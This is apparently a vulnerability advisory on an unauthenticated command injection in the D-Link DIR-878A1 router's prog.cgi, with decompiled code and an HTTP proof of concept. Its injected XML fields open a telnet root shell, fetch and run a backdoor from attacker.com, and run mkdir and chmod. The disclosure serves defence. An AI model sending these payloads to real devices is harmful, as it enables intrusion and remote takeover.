# Command Injection Vulnerability in `SetNetworkSettings`

1. Vulnerability Overview

| **Field**            | **Details**                                               |
| -------------------- | --------------------------------------------------------- |
| Affected Product     | D-Link DIR-878A1 Router                                   |
| Firmware Version     | **FW101B04.bin** (other versions require verification)    |
| Vulnerability Type   | **Unauthenticated Command Injection**                     |
| Vulnerable Component | `prog.cgi` (`SetNetworkSettings` handler function)        |
| Prerequisites        | No authentication required (remote exploitation possible) |

2. Exploitation Path

```c
// prog.cgi
int __fastcall sub_4330B0(int a1)
{
  ...
  VarString = (const char *)webGetVarString(a1, "/SetNetworkSettings/IPAddress");
  if ( !VarString )
    return WebsSetResponseResult(a1, 11);
  v7 = (const char *)webGetVarString(a1, "/SetNetworkSettings/SubnetMask");
  if ( !v7 )
    return WebsSetResponseResult(a1, 11);
  ...
  nvram_safe_set("lan0_ipaddr", VarString);
  if ( (unsigned int)strlen(VarString) >= 7 )
  {
    sprintf(v39, "echo %s >/proc/ipinfo/ip_addr", VarString);
    system(v39);
  }
  nvram_safe_set("lan0_netmask", v7);
  if ( (unsigned int)strlen(v7) >= 7 )
  {
    sprintf(v39, "echo %s >/proc/ipinfo/net_mask", v7);
    system(v39);
  }
  ...
}
```

3. **Vulnerable Binary:** `prog.cgi`.

4. 0-Day Command Injection Exploitation Path:

   - In `prog.cgi`, line 5: `VarString = (const char *)webGetVarString(a1, "/SetNetworkSettings/IPAddress")` receives user input, which is concatenated and passed to line 16: `system(v39)`, resulting in command injection.

   - In `prog.cgi`, line 8: `v7 = (const char *)webGetVarString(a1, "/SetNetworkSettings/SubnetMask")` receives user input, which is concatenated and passed to line 22: `system(v39)`, resulting in command injection.

5. Proof of Concept (PoC) for Reproducing the Vulnerability:

```http
POST /cgi-bin/prog.cgi HTTP/1.1
Host: 192.168.0.1
Content-Type: application/xml

<!-- IPAddress Injection -->
<SetNetworkSettings>
    <IPAddress>127.0.0.1; telnetd -l /bin/sh -p 2323 #</IPAddress>
    <SubnetMask>255.255.255.0</SubnetMask>
</SetNetworkSettings>

<!-- SubnetMask Injection -->
<SetNetworkSettings>
    <IPAddress>192.168.0.1</IPAddress>
    <SubnetMask>255.255.255.0; wget http://attacker.com/backdoor -O /tmp/bd; 
    sh /tmp/bd</SubnetMask>
</SetNetworkSettings>

<!-- Dual Injection -->
<SetNetworkSettings>
    <IPAddress>127.0.0.1; mkdir /tmp/exploit</IPAddress>
    <SubnetMask>255.255.255.0; chmod 777 /tmp/exploit</SubnetMask>
</SetNetworkSettings>
```